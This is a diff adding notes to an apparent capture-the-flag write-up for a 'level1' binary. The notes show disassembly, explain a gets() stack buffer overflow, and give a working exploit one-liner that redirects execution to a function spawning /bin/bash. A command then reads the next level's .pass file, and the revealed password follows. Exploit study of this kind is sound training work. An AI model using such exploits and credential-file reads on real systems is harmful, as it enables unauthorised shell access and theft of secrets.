@@ -12,4 +12,42 @@ this algo will apply almost to any binary file to collect info about:
 	info frame, set $<regname>=<value>)
 
 
+08048480 <main>:
+ 8048480:       55                      push   %ebp
+ 8048481:       89 e5                   mov    %esp,%ebp
+ 8048483:       83 e4 f0                and    $0xfffffff0,%esp
+ 8048486:       83 ec 50                sub    $0x50,%esp
+ 8048489:       8d 44 24 10             lea    0x10(%esp),%eax
+ 804848d:       89 04 24                mov    %eax,(%esp)
+ 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
+ 8048495:       c9                      leave  
+
+
+-main allocates on stack char buffer with size 76 (sub $0x50, $esp)
+0x50 = 80bytes and 4 bytes for pointer = 80 - 4 = 76
+
+than it calls 'gets' which is an unprotected function that can cause a buffer overflow
+
+so if we pass 76 dummy bytes we can get on program's stack 
+and do w/e we please
+
+analysing further we found function 'run':
+which according to .rodata prints "Good...Wait what?" with fwrite
+and than executes system("/bin/bash")
+
+ so we can try get on stack and rewrite 'eip' register of the program to point on the function run after returning from 'gets'
+
+we starting writing at 0xbffff5f0 
+and if we write 76 bytes we get to the address 0xbffff63c (0xbffff5f0 + 76) which is an adress where eip is saved
+so write after 76 bytes we write an address to the function run 
+its going to be something like this:
+
+NOTE: address is an small endian, reads fro low to high (right to left)
+
+python -c 'print "a" * 76 + "\x08\x04\x84\x44"[::-1]' >  /tmp/exploit
+cat /tmp/exploit - | ./level1 
+
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
 
